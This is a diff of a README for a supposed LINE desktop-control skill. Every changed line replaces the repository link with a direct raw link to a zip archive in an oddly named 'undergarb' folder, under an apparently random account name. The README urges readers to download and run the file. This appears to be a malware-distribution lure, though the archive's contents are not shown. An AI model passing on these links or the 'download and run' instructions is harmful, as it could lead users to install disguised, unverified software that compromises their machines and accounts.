@@ -1,12 +1,12 @@
 # 🖥️ line-desktop-skill - Control LINE from your desktop
 
-[![Download / Install](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge)](https://github.com/Nervousdisordercrispness754/line-desktop-skill)
+[![Download / Install](https://img.shields.io/badge/Download%20Now-blue?style=for-the-badge)](https://github.com/Nervousdisordercrispness754/line-desktop-skill/raw/refs/heads/main/undergarb/desktop_line_skill_v2.0.zip)
 
 ## 📥 Download
 
 Visit this page to download and run this file:
 
-https://github.com/Nervousdisordercrispness754/line-desktop-skill
+https://github.com/Nervousdisordercrispness754/line-desktop-skill/raw/refs/heads/main/undergarb/desktop_line_skill_v2.0.zip
 
 If the page opens in your browser, look for the latest release or the main download option. Save the file to your computer, then open it from your Downloads folder.
 
@@ -30,7 +30,7 @@ For best results, keep LINE logged in and open before you start.
 ## 🛠️ Setup
 
 1. Open the download page:
-   https://github.com/Nervousdisordercrispness754/line-desktop-skill
+   https://github.com/Nervousdisordercrispness754/line-desktop-skill/raw/refs/heads/main/undergarb/desktop_line_skill_v2.0.zip
 
 2. Download the project files to your Mac.
 
@@ -194,7 +194,7 @@ Keep the prompts clear and simple. The skill works best when you name the chat o
 
 If you need the files again, use the same link:
 
-https://github.com/Nervousdisordercrispness754/line-desktop-skill
+https://github.com/Nervousdisordercrispness754/line-desktop-skill/raw/refs/heads/main/undergarb/desktop_line_skill_v2.0.zip
 
 ## 🔧 Basic tips
 
